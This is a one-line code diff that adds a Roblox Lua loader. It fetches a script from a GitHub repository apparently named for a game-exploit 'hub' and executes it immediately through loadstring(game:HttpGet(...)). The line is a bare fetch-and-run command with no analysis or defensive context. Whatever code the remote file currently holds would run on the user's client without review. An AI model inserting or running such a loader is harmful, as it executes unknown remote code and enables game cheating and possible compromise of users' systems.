@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/t1sv/skidware-hub/refs/heads/main/loader/swh.lua",true))()
